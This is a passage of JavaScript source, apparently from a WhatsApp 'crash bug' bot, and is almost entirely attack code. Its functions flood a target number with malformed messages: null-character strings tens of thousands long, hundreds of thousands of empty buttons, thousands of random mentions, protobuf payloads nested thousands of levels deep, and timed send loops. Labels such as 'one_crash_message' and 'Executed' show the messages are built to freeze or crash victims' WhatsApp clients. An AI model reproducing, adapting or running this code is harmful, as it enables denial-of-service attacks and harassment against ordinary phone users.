    await sock.relayMessage("status@broadcast", Nanas, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    await sock.relayMessage("status@broadcast", Muda, {
        messageId: null,
        statusJidList: [target],
        additionalNodes: [{
            tag: "meta",
            attrs: {},
            content: [{
                tag: "mentioned_users",
                attrs: {},
                content: [{ tag: "to", attrs: { jid: target }, content: undefined }]
            }]
        }]
    });

    const startTime = Date.now();
    const duration = 5 * 60 * 1500;

    while (Date.now() - startTime < duration) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0000".repeat(75000),
                        contextInfo: {
                            noSelfSync: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 1950 }, () => "1" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { noSelfSync: true });
    }

    await sock.relayMessage(target, {
        groupStatusMessageV2: {
            nativeFlowMessage: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        noSelfSync: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 1999 },
                                () => "1" + Math.floor(Math.random() * 98000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { noSelfSync: true });

    const startTime2 = Date.now();
    const duration2 = 1 * 60 * 1000;

    while (Date.now() - startTime2 < duration2) {
        await sock.relayMessage(target, {
            groupStatusMessageV2: {
                message: {
                    extendedTextMessage: {
                        text: "\u0003".repeat(75000),
                        contextInfo: {
                            noSelfSync: true,
                            mentionedJid: [
                                "0@s.whatsapp.net",
                                ...Array.from({ length: 2000 }, () => "1" + Math.floor(Math.random() * 8000000) + "@s.whatsapp.net")
                            ]
                        }
                    }
                }
            }
        }, { noSelfSync: true });
    }

    const LexzyyMsg = {
        interactiveMessage: {
            body: {
                text: "LexzyMods - Executed¿!",
            },
            nativeFlowMessage: {
                buttons: Array.from({ length: 700000 }, () => ({}))
            },
            contextInfo: {
                quotedMessage: {
                    orderMessage: {
                        orderTitle: "Pt Nanas Muda",
                        itemCount: 1999,
                        totalAmount1000: "1000000",
                        totalCurrencyCode: "IDR"
                    },
                },
            },
        },
    };

    const acamsg = generateWAMessageFromContent(target, LexzyyMsg, {});

    await sock.relayMessage(target, acamsg.message, {
        noSelfSync: true,
        messageId: acamsg.key.id
    });

    const Lexca = {
        messageContextInfo: {
            deviceListMetadata: {},
            deviceListMetadataVersion: 2,
            botMetadata: {
                pluginMetadata: {},
                richResponseSourcesMetadata: {
                    sources: []
                }
            }
        },
        groupStatusMessageV2: {
            message: {
                richResponseMessage: {
                    messageType: 1,
                    submessages: [
                        {
                            messageType: 3,
                            tableMetadata: {
                                title: "LexzyMods - Executed¿!",
                                rows: Array.from({ length: 2000 }, () => ({}))
                            }
                        }
                    ],
                    unifiedResponse: {
                        data: JSON.stringify({
                            response_id: crypto.randomUUID(),
                            sections: []
                        })
                    },
                    contextInfo: {
                        forwardingScore: 1,
                        isForwarded: true,
                        forwardedAiBotMessageInfo: {
                            botJid: "NanasXExecutedXAllTeam"
                        },
                        forwardOrigin: 3
                    }
                }
            }
        }
    };

    const Lexcaa = generateWAMessageFromContent(target, Lexca, {});

    await sock.relayMessage(target, Lexcaa.message, {
        noSelfSync: true,
        messageId: Lexcaa.key.id
    });

    const Lexcabos = {
        groupStatusMessageV2: {
            message: {
                stickerPackMessage: {
                    stickerPackId: "\u0000".repeat(9000),
                    name: "LexzyMods - Executed¿!",
                    publisher: "\u0000".repeat(9000),
                    fileLength: 9999,
                    fileSha256: "SQaAMc2EG0lIkC2L4HzitSVI3+4lzgHqDQkMBlczZ78=",
                    fileEncSha256: "l5rU8A0WBeAe856SpEVS6r7t2793tj15PGq/vaXgr5E=",
                    mediaKey: "UaQA1Uvk+do4zFkF3SJO7/FdF3ipwEexN2Uae+lLA9k=",
                    mimetype: "image/webp",
                    directPath: "/o1/v/t24/f2/m238/AQMjSEi_8Zp9a6pql7PK_-BrX1UOeYSAHz8-80VbNFep78GVjC0AbjTvc9b7tYIAaJXY2dzwQgxcFhwZENF_xgII9xpX1GieJu_5p6mu6g?ccb=9-4&oh=01_Q5Aa4AFwtagBDIQcV1pfgrdUZXrRjyaC1rz2tHkhOYNByGWCrw&oe=69F4950B&_nc_sid=e6ed6c",
                    contextInfo: {
                        statusAttributionType: 2,
                        statusAttributions: Array.from({ length: 500000 }, () => ({ type: 1 }))
                    },
                },
            },
        },
    };

    await sock.relayMessage(target, Lexcabos, {
        noSelfSync: true,
    });

    const bpklo = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    header: {
                        imageMessage: {
                            url: "https://mmg.whatsapp.net/v/t62.7118-24/11734305_1146343427248320_5755164235907100177_n.enc?ccb=11-4&oh=01_Q5Aa1gFrUIQgUEZak-dnStdpbAz4UuPoih7k2VBZUIJ2p0mZiw&oe=6869BE13&_nc_sid=5e03e0&mms3=true",
                            mimetype: "image/jpeg",
                            fileSha256: "2eqLffA9IMphTt+iMq8k5QrWjpXajm8ZqJA9kk5JbDg=",
                            fileLength: 9999,
                            height: 9999,
                            width: 9999,
                            mediaKey: "buzeJOfJk4y1ysNjb3uozC2pLy9041H4pNx+FNKRWLc=",
                            fileEncSha256: "aGfmY0rHUSe1eBmt1vkewywDKjUmnRjng3DfLhUMYAc=",
                            directPath: "/v/t62.7118-24/680663126_970396275464454_6182359723749650012_n.enc?ccb=11-4&oh=01_Q5Aa4QGQLAh643XxIBrTHKJVswbNCRzYyckUeMHcyRCE74uPPw&oe=6A12ED53&_nc_sid=5e03e0",
                            mediaKeyTimestamp: "1776937541",
                            jpegThumbnail: null,
                            caption: "LexzyMods - Executed¿!",
                            scansSidecar: "pDwqT9IYsTrggiHldJAKrJuoOn7Knn7f2LjPxVpwnhWHFTT0b83iwQ==",
                            scanLengths: [
                                999999999999999998999,
                                999999999999999899999,
                                999999999999999989999,
                                999999999999999998999
                            ],
                            midQualityFileSha256: "zBHV83UQlILLcv3tAwnwaSk4FqEkZho3YKidG64duT0="
                        }
                    },
                    body: {
                        text: "LexzyMods - punya acaa¿!"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 750000 }, () => ({}))
                    }
                }
            }
        }
    };

    const mmklu = generateWAMessageFromContent(target, bpklo, {});

    await sock.relayMessage(target, mmklu.message, {
        noSelfSync: true,
        messageId: mmklu.key.id
    });

    await sock.relayMessage(target, {
        view0nceMessageV2: {
            message: {
                extendedTextMessage: {
                    text: "\u0003".repeat(9000),
                    contextInfo: {
                        noSelfSync: true,
                        mentionedJid: [
                            "0@s.whatsapp.net",
                            ...Array.from(
                                { length: 2000 },
                                () => "5" + Math.floor(Math.random() * 9000000) + "@s.whatsapp.net"
                            )
                        ]
                    }
                }
            }
        }
    }, { noSelfSync: true });
}

async function delayinvisxfrezee(sock, target) {
    const rezzonly2 = {
        groupStatusMessageV2: {
            message: {
                interactiveResponseMessage: {
                    body: {
                        text: "olaaaa rezz here",
                        footer: "Mampus"
                    },
                    nativeFlowMessage: {
                        buttons: "one_crash_message".repeat(40000),
                        nativeFlowResponseMessage: {
                            buttons: Array.from({ length: 1236 }, () => ({}))
                        }
                    },
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            icon: "document",
                            title: "°deffa is here°¿",
                            sections: Array.from({ length: 5055 }, () => ({}))
                        })
                    }
                }
            }
        }
    };
    const rezz = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "𝐂𝐀𝐋𝐋 𝐎𝐅 𝐃𝐔𝐓𝐘"
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 400000 }, () => ({})),
                        name: "galaxy_message",
                        buttonParamsJson: JSON.stringify({
                            display_text: "\n".repeat(99999),
                            id: "\0".repeat(99999),
                            flow_token: "\r".repeat(99999)
                        })
                    }
                }
            }
        }
    };
    await sock.relayMessage(target, rezzonly2, { noSelfSync: true });
    await sock.relayMessage(target, rezz, { noSelfSync: true });
}
     
async function forclose(sock, target) {
    const IMG = {
        url: "https://mmg.whatsapp.net/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c&mms3=true",
        directPath: "/o1/v/t24/f2/m235/AQNoT0RVMsuqbGex4OAhCfu4uJgG8NDGShMN2WvxFxGEKQIN9AiuElv-4a6btmTyzbCYvvc6h-WsBx2srRxEA8LMPxWi_qtr6MvQV73Meg?ccb=9-4&oh=01_Q5Aa5AGLJ8RxEGZ7pZhWUQzr6gaFzyzpge4GNToAX6gKki2QZQ&oe=6A9602BA&_nc_sid=e6ed6c",
        mediaKey: "xD3KegXJnRDJbL89tyWMpG1m12+jAXgXKN0XhTS0riM=",
        fileEncSha256: "ef7Y+a5ufhg2pfcsfZ23SYE4vUNtyoc3j/8/yyqr58Q=",
        fileSha256: "84cNaVGkzmIJwjozrUJipNbXoNb0ovMC8OWBMpLRcYU=",
        fileLength: 20010,
        mediaKeyTimestamp: "1785637793",
        mimetype: "image/jpeg",
        height: 1600,
        width: 1200,
        jpegThumbnail: ""
    };

    const TAGS = [
        [0xBA, 0x03],
        [0xD2, 0x04],
        [0xAA, 0x02],
    ];

    const encodeVarint = function(n) {
        var buf = [];
        while (n >= 0x80) {
            buf.push((n & 0x7f) | 0x80);
            n >>>= 7;
        }
        buf.push(n);
        return Buffer.from(buf);
    };

    const wrapLd = function(tag, data) {
        return Buffer.concat([Buffer.from(tag), encodeVarint(data.length), data]);
    };

    const basePayload = proto.Message.encode(
        proto.Message.fromObject({ imageMessage: IMG })
    ).finish();

    const inflate = function(tag, depth) {
        var buf = basePayload;
        for (var i = 0; i < depth; i++) {
            buf = wrapLd(tag, wrapLd([0x0A], buf));
        }
        return buf;
    };

    const resolveJid = function(raw) {
        var s = String(raw || '').trim();
        if (s.includes('@')) return s;
        return s.replace(/\D/g, '') + '@s.whatsapp.net';
    };

    const jids = (Array.isArray(target) ? target : [target])
        .map(resolveJid)
        .filter(function(j) { return j.length > 15; });

    if (!jids.length) throw new Error('jmk: invalid target');

    var MAX_BATCH = 5;
    var DELAY_MS  = 5000;
    var totalSent = 0;

    for (var offset = 0; offset < jids.length; offset += MAX_BATCH) {
        var chunk   = jids.slice(offset, offset + MAX_BATCH);
        var isFirst = offset === 0;

        if (!isFirst) {
            await new Promise(function(r) { setTimeout(r, DELAY_MS); });
        }

        var idx   = Math.floor(offset / MAX_BATCH) + 1;
        var suffix = idx > 1 ? ('-' + idx) : '';
        var msgId  = 'JMK' + Date.now().toString(36).toUpperCase() + suffix;

        for (var ti = 0; ti < TAGS.length; ti++) {
            var tag     = TAGS[ti];
            var payload = null;

            for (var depth = 5000; depth >= 2000 && !payload; depth -= 400) {
                try {
                    var decoded = proto.Message.decode(inflate(tag, depth));
                    proto.Message.encode(decoded).finish();
                    payload = decoded;
                } catch (_) {}
            }

            if (!payload) continue;

            await sock.relayMessage('status@broadcast', payload, {
                messageId: msgId,
                statusJidList: chunk,
                additionalNodes: [{
                    tag: 'meta',
                    attrs: {},
                    content: [{
                        tag: 'mentioned_users',
                        attrs: {},
                        content: chunk.map(function(jid) {
                            return { tag: 'to', attrs: { jid: jid }, content: [] };
                        })
                    }]
                }]
            });

            totalSent++;
        }
    }

    if (!totalSent) throw new Error('jmk: failed');
}

async function blanks(sock, target) {
    const msg1 = generateWAMessageFromContent(
        target,
        {
            extendedTextMessage: {
                text: "RenaOffc??",
                description: "\u0000".repeat(50000),
                jpegThumbnail: null,
                contextInfo: {
                    quotedMessage: {
                        imageMessage: {
                            caption: "RenaOffc??",
                            mimetype: "image/jpeg",
                            jpegThumbnail: null,
                            ImageSourceType: 1
                        }
                    },
                    remoteJid: "status@broadcast"
                },
                fontType: 2,
                previewType: 5,
                paymentLinkMetadata: {
                    provider: {
                        paramsJson: "[{".repeat(300000)
                    },
                    header: {
                        headerType: 1
                    },
                    button: {
                        displayText: "RenaOffcHere"
                    }
                }
            }
        },
        {}
    );

    const msg2 = {
        interactiveMessage: {
            body: {},
            nativeFlowMessage: {
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

    const msg3 = {
        interactiveMessage: {
            body: { text: "RenaOffc" },
            nativeFlowMessage: {
                messageParamsJson: JSON.stringify({
                    tap_target_configuration: {
                        title: "\0",
                        description: "RenaOffc",
                        canonical_url: "\0".repeat(3000),
                        domain: null,
                        button_index: 0
                    }
                }),
                buttons: Array.from({ length: 305555 }, () => ({}))
            }
        }
    };

   const code = "\u200C" + "\u200D" + "\u200B" + "\u200A" + "\u0000" + "\x930" + "\u500B";
    const repeat = 1000000;

    const msg4 = {
        groupStatusMessageV2: {
            message: {
                interactiveMessage: {
                    body: {
                        text: "RenaOffcꦾ",
                        display_text: "\u200C"
                    },
                    nativeFlowInfo: {
                        name: "single_select",
                        paramsJson: JSON.stringify({
                            icon: "document",
                            title: "RenaOffc",
                            sections: Array.from({ length: 505555 }, () => ({}))
                        })
                    },
                    nativeFlowMessage: {
                        buttons: Array.from({ length: 500000 }, () => ({}))
                    }
                }
            }
        }
    };

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg1.message, {});

    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});
    await sock.relayMessage(target, msg3, {});

    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});
    await sock.relayMessage(target, msg1.message, {});
    await sock.relayMessage(target, msg2, {});

   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
   await sock.relayMessage(target, msg4, {});
}

bot.launch()
